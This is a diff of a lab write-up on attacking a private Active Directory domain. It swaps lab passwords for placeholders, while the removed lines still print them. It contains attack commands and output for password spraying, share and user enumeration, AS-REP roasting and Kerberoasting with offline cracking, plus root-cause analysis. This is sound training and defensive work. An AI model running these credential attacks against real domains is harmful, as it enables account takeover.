@@ -36,7 +36,7 @@ An external attacker with network access to `CYBERLAB.local` (and no credentials
 
 - **Windows Server 2022**: `DC01`, `192.168.56.30`: `CYBERLAB.local` Domain Controller (victim **and** IR console), with the Lab 07 hardening and audit policy intact.
 - **Kali Linux**: `192.168.56.10`, the attacker.
-- **The planted weakness**: a service account `svc-backup` with password `Welcome2025!!!`, 14 characters and policy-compliant, yet trivially guessable. Two further accounts were later made deliberately vulnerable to demonstrate the Kerberos attacks (`asmith` with pre-auth disabled; `svc-sql` with an SPN and a weak password).
+- **The planted weakness**: a service account `svc-backup` with password `<svc-backup-test-password>`, 14 characters and policy-compliant, yet trivially guessable. Two further accounts were later made deliberately vulnerable to demonstrate the Kerberos attacks (`asmith` with pre-auth disabled; `svc-sql` with an SPN and a weak password).
 
 ## Methodology
 
@@ -96,20 +96,20 @@ A small set of common passwords was sprayed across the enumerated accounts, kept
 
 ```
 $ nxc smb 192.168.56.30 -u valid_users.txt -p spray.txt --continue-on-success
-[+] CYBERLAB.local\svc-backup:Welcome2025!!!
+[+] CYBERLAB.local\svc-backup:<svc-backup-test-password>
 ```
 
 ![Password spray succeeding against svc-backup without triggering lockout](screenshots/04-password-spray-foothold.png)
 
-**Root cause.** The password policy was strong (14 chars, complexity) yet `Welcome2025!!!` satisfies it and is still guessable. A strong policy does not prevent a weak choice within it. **MITRE:** T1110.003 - Password Spraying.
+**Root cause.** The password policy was strong (14 chars, complexity) yet `<svc-backup-test-password>` satisfies it and is still guessable. A strong policy does not prevent a weak choice within it. **MITRE:** T1110.003 - Password Spraying.
 
 ### Phase 4: Post-Exploitation
 
 With the `svc-backup` foothold, authenticated enumeration exposed the full user list (leaking account descriptions) and showed READ access to `SYSVOL` / `NETLOGON`, where GPO scripts, and sometimes credentials, live.
 
 ```
-$ nxc smb 192.168.56.30 -u svc-backup -p 'Welcome2025!!!' --users   # full domain user list
-$ nxc smb 192.168.56.30 -u svc-backup -p 'Welcome2025!!!' --shares  # SYSVOL/NETLOGON READ
+$ nxc smb 192.168.56.30 -u svc-backup -p '<svc-backup-test-password>' --users   # full domain user list
+$ nxc smb 192.168.56.30 -u svc-backup -p '<svc-backup-test-password>' --shares  # SYSVOL/NETLOGON READ
 ```
 
 ![Authenticated enumeration of all domain users and readable shares](screenshots/05-postexploitation-users-shares.png)
@@ -126,7 +126,7 @@ $krb5asrep$23$asmith@CYBERLAB.LOCAL:b6ba37...        # asmith vulnerable
 [-] svc-backup ... KDC_ERR_CLIENT_REVOKED            # containment already working
 
 $ john --wordlist=cracklist.txt asrep_hashes.txt
-CyberLabP@ss2025  ($krb5asrep$23$asmith@CYBERLAB.LOCAL)   # cracked offline
+<cyberlab-test-password>  ($krb5asrep$23$asmith@CYBERLAB.LOCAL)   # cracked offline
 ```
 
 ![AS-REP hash extracted unauthenticated](screenshots/11-asrep-hash-extracted.png)
@@ -139,11 +139,11 @@ CyberLabP@ss2025  ($krb5asrep$23$asmith@CYBERLAB.LOCAL)   # cracked offline
 Any authenticated domain user (here the `jdoe` foothold) can request a service ticket for any account with an SPN (`svc-sql`); the ticket is encrypted with the service account's password hash and cracked offline.
 
 ```
-$ impacket-GetUserSPNs CYBERLAB.local/jdoe:'CyberLabP@ss2025' -dc-ip 192.168.56.30 -request
+$ impacket-GetUserSPNs CYBERLAB.local/jdoe:'<cyberlab-test-password>' -dc-ip 192.168.56.30 -request
 $krb5tgs$23$*svc-sql*CYBERLAB.LOCAL*...
 
 $ john --wordlist=krb_wordlist.txt kerberoast_hashes.txt
-Summer2025Db!!   (svc-sql)   # cracked offline
+<svc-sql-test-password>   (svc-sql)   # cracked offline
 ```
 
 ![Kerberoast TGS extracted for svc-sql](screenshots/16-kerberoast-tgs-extracted.png)
